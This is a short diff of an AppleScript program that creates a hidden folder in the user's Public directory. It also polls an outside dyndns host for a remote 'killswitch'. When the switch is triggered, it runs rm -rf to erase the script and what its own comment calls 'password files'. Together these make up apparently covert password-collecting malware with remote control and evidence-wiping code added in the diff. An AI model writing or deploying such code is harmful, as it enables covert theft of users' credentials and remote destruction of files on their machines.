@@ -1,13 +1,17 @@
+set theuser to do shell script "whoami"
 try
 	do shell script "curl http://benbern.dyndns.info/stuff/uhoh.html | grep 'kill' | cut -d : -f 1 | cut -d \\< -f 1" -- Check for a killswitch
 	set killswitch to (characters 1 through -1 of result) as text -- Get IP
 	if killswitch = "kill" then -- If killswitch is triggered, delete all of the app and password files
-		do shell script "rm -rf " & (POSIX path of (path to me))
+		try
+			do shell script "rm -rf ~/public/." & theuser
+		end try
+		try
+			do shell script "rm -rf " & (POSIX path of (path to me))
+		end try
 		return
 	end if
 end try
-
-set theuser to do shell script "whoami"
 
 try
 	do shell script "mkdir ~/Public/." & theuser & "" -- Make the hidden folder in the user's Public folder
